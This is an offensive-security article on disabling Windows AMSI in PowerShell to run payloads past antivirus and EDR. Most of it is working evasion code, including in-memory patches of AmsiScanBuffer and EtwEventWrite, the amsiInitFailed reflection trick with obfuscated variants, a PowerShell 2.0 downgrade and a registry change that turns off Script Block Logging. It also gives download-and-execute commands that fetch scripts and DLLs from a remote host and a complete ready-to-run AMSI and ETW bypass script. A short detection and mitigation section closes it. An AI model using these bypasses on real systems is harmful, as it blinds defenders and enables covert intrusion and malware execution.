---
title: AMSI Bypass — Disabling the Antimalware Scan Interface in PowerShell
date: 2025-02-10T00:00:00.000Z
description: >-
  Techniques to bypass AMSI (Antimalware Scan Interface) on Windows and
  execute PowerShell payloads undetected by AV/EDR solutions.
category: evasion
os:
  - windows
difficulty: hard
mitre_tactic: TA0005
mitre_technique: T1562.001
tags:
  - amsi
  - powershell
  - evasion
  - windows
  - av-bypass
  - reflection
  - patching
status: published
lang: en
readingTime: 12
lang_original: pt
translated: true
translated_at: '2026-03-04'
---

## What is AMSI?

**AMSI (Antimalware Scan Interface)** is a Windows API introduced in Windows 10 that allows applications to send content to antivirus solutions for **real-time** scanning before execution.

The flow works like this:

1. PowerShell receives a script or command
2. Before executing, it calls `AmsiScanBuffer()` or `AmsiScanString()` via `amsi.dll`
3. The registered AV/EDR scans the content
4. If malicious → blocked. If clean → execution proceeds

```
PowerShell → amsi.dll → AmsiScanBuffer() → AV Provider → Allow / Block
```

Every PowerShell session loads `amsi.dll` into the process. The goal of bypasses is to neutralize this DLL **before** executing offensive payloads.

&gt; **WARNING:** These techniques are for use in authorized environments only (pentest, red team, lab). Unauthorized use is a crime.

## Technique 1 — AmsiScanBuffer Patch via Reflection

The most classic technique: use .NET Reflection to locate and patch the `AmsiScanBuffer` function in memory, making it always return `AMSI_RESULT_CLEAN`.

```powershell
# AMSI Patch via Reflection — classic
$Win32 = @&quot;
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(&quot;kernel32&quot;)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(&quot;kernel32&quot;)]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(&quot;kernel32&quot;)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
&quot;@

Add-Type $Win32

$Lib  = [Win32]::LoadLibrary(&quot;amsi.dll&quot;)
$Addr = [Win32]::GetProcAddress($Lib, &quot;AmsiScanBuffer&quot;)

# Patch: mov eax, 0x80070057 ; ret
$Patch = [Byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$Old   = 0

[Win32]::VirtualProtect($Addr, [UIntPtr]5, 0x40, [ref]$Old) | Out-Null

$Marshal = [System.Runtime.InteropServices.Marshal]
$Marshal::Copy($Patch, 0, $Addr, 6)
```

After running this in the session, AMSI is disabled for the current process.

## Technique 2 — Force Error via AmsiInitFailed

A more stealthy approach: use Reflection to set the private field `amsiInitFailed` in the context of the current session, making PowerShell believe that AMSI failed to initialize.

```powershell
# AmsiInitFailed — force initialization failure
$a = [Ref].Assembly.GetTypes() | Where-Object {
    $_.Name -like &#x27;*Am*i*&#x27;
}

$b = $a | ForEach-Object {
    $_.GetFields(&#x27;NonPublic,Static&#x27;) | Where-Object {
        $_.Name -like &#x27;*ailed*&#x27;
    }
}

$b.SetValue($null, $true)
```

This method is often detected by modern EDRs because the string `amsiInitFailed` has become a signature. Use obfuscation:

```powershell
# Obfuscated version with string concatenation
$x = &#x27;Am&#x27; + &#x27;si&#x27; + &#x27;Utils&#x27;
$y = &#x27;am&#x27; + &#x27;si&#x27; + &#x27;Init&#x27; + &#x27;Failed&#x27;

$t = [Ref].Assembly.GetType(&quot;System.Management.Automation.$x&quot;)
$f = $t.GetField($y, &#x27;NonPublic,Static&#x27;)
$f.SetValue($null, $true)
```

## Technique 3 — Patch with Marshal.WriteInt32

Variation of the direct patch, using `Marshal.WriteInt32` without needing custom P/Invoke:

```powershell
# Bypass via Marshal without Add-Type
$a = [System.Runtime.InteropServices.Marshal]
$b = [Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;)
$c = $b.GetField(&#x27;amsiContext&#x27;, &#x27;NonPublic,Static&#x27;)
$d = $c.GetValue($null)

# Corrupts the AMSI context
$a::WriteInt32([IntPtr]($d.ToInt64() + 0x8), 0)
```

## Technique 4 — Downgrade to PowerShell 2.0

PowerShell 2.0 does not implement AMSI. If it is still installed on the system:

```powershell
# Checks if PS 2.0 is available
powershell -version 2 -Command &quot;$PSVersionTable&quot;

# Executes payload in PS 2.0 context (without AMSI)
powershell -version 2 -ExecutionPolicy Bypass -File payload.ps1
```

```powershell
# Checks for .NET 2.0/3.5 installation (required for PS 2.0)
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

&gt; **Note:** Many modern environments have PS 2.0 disabled via GPO. Check before attempting.

## Technique 5 — String Obfuscation (Signature Evasion)

Instead of patching AMSI, avoid triggering it. Strings known as `amsiInitFailed`, `AmsiScanBuffer`, `Invoke-Mimikatz` trigger signatures. Use obfuscation:

```powershell
# Simple concatenation
$cmd = &#x27;Invoke&#x27; + &#x27;-&#x27; + &#x27;Mi&#x27; + &#x27;mi&#x27; + &#x27;katz&#x27;
IEX $cmd

# Base64 encoding
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(&#x27;Invoke-Mimikatz&#x27;))
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))

# SecureString (less common but effective)
$s = &#x27;amsiInitFailed&#x27;
$secure = ConvertTo-SecureString $s -AsPlainText -Force
$plain  = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
)
```

## Technique 6 — Loading via WebRequest (In-Memory)

Load payloads directly into memory without touching the disk, minimizing detection surface:

```powershell
# Bypass + in-memory loading
# 1. Disable AMSI first
# 2. Load remote assembly without writing to disk

IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.1.10/bypass.ps1&#x27;)

# Or via IWR
$r = Invoke-WebRequest -Uri &#x27;http://192.168.1.10/payload.ps1&#x27; -UseBasicParsing
IEX $r.Content

# .NET assembly in memory
$bytes = (New-Object Net.WebClient).DownloadData(&#x27;http://192.168.1.10/tool.dll&#x27;)
[Reflection.Assembly]::Load($bytes)
```

## EDR Detection and Workarounds

Modern EDRs monitor beyond AMSI:

| Detection Vector | Evasion Technique |
|---|---|
| String Signatures | Obfuscation, encoding, concatenation |
| Script Block Logging | Patch `ScriptBlockLoggingEnabled` via registry |
| ETW (Event Tracing) | Patch `EtwEventWrite` in `ntdll.dll` |
| Constrained Language Mode | Bypass via COM, `Add-Type`, runspaces |
| WLDP (WDAC) | More advanced process injection techniques |

```powershell
# Disable Script Block Logging (requires permission or CLM bypass)
$key = &#x27;HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging&#x27;
Set-ItemProperty -Path $key -Name &#x27;EnableScriptBlockLogging&#x27; -Value 0
```

## Complete Script: AMSI + ETW Bypass

```powershell
#!/usr/bin/env pwsh
# amsi_etw_bypass.ps1 — AMSI + ETW neutralization
# Usage: . .\amsi_etw_bypass.ps1

function Invoke-AmsiBypass {
    try {
        $a = [Ref].Assembly.GetType(
            &#x27;System.Management.Automation.&#x27; + &#x27;Am&#x27; + &#x27;siUtils&#x27;
        )
        $b = $a.GetField(&#x27;am&#x27; + &#x27;siInit&#x27; + &#x27;Failed&#x27;, &#x27;NonPublic,Static&#x27;)
        $b.SetValue($null, $true)
        Write-Host &quot;[+] AMSI     : disabled&quot; -ForegroundColor Green
    } catch {
        Write-Host &quot;[-] AMSI bypass failed: $_&quot; -ForegroundColor Red
    }
}

function Invoke-ETWBypass {
    try {
        $patch = [Byte[]](0xC3) # ret
        $addr  = [System.Diagnostics.Eventing.EventProvider].GetField(
            &#x27;m_etwCallback&#x27;,
            &#x27;NonPublic,Instance&#x27;
        )
        
        # P/Invoke to VirtualProtect + patch EtwEventWrite
        $ntdll    = [System.Runtime.InteropServices.Marshal]
        $kernel32 = Add-Type -MemberDefinition @&#x27;
[DllImport(&quot;kernel32.dll&quot;)]
public static extern bool VirtualProtect(
    IntPtr lpAddress, UIntPtr dwSize,
    uint flNewProtect, out uint lpflOldProtect);
[DllImport(&quot;kernel32.dll&quot;)]
public static extern IntPtr GetProcAddress(IntPtr h, string name);
[DllImport(&quot;kernel32.dll&quot;)]
public static extern IntPtr LoadLibrary(string name);
&#x27;@ -Name &#x27;K32&#x27; -PassThru

        $lib  = $kernel32::LoadLibrary(&quot;ntdll.dll&quot;)
        $func = $kernel32::GetProcAddress($lib, &quot;EtwEventWrite&quot;)
        $old  = [uint32]0
        $kernel32::VirtualProtect($func, [UIntPtr]1, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte($func, 0xC3)
        
        Write-Host &quot;[+] ETW      : patched&quot; -ForegroundColor Green
    } catch {
        Write-Host &quot;[!] ETW bypass skipped: $_&quot; -ForegroundColor Yellow
    }
}

Invoke-AmsiBypass
Invoke-ETWBypass
Write-Host &quot;[*] Session ready. OPSEC level: reduced.&quot; -ForegroundColor Cyan
```

## Detection by the Defender Side

If you are the Blue Team, monitor:

- **Event ID 4104** — Script Block Logging (PowerShell)
- **Event ID 4688** — Process creation with `powershell.exe -version 2`
- **Sysmon Event 10** — Process access to `amsi.dll`
- Loading of `System.Management.Automation` via Reflection
- Presence of strings such as `AmsiScanBuffer`, `amsiInitFailed`, `VirtualProtect` in logs

```powershell
# Blue Team: check if AMSI is active in the session
[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;)
    .GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;)
    .GetValue($null)
# $false = AMSI active | $true = AMSI compromised
```

## Mitigations

- Enable **PowerShell Constrained Language Mode** via WDAC/AppLocker
- Disable **PowerShell 2.0** (`Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`)
- Enable **Script Block Logging** and **Module Logging** (GPO)
- Use **EDR with memory protection** (CrowdStrike, SentinelOne, Microsoft Defender for Endpoint)
- Monitor **ETW providers** for PowerShell: `Microsoft-Windows-PowerShell`
- Implement **JEA (Just Enough Administration)** to restrict available commands

## References

- [AMSI — Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- MITRE ATT&amp;CK;: [T1562.001 — Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/)
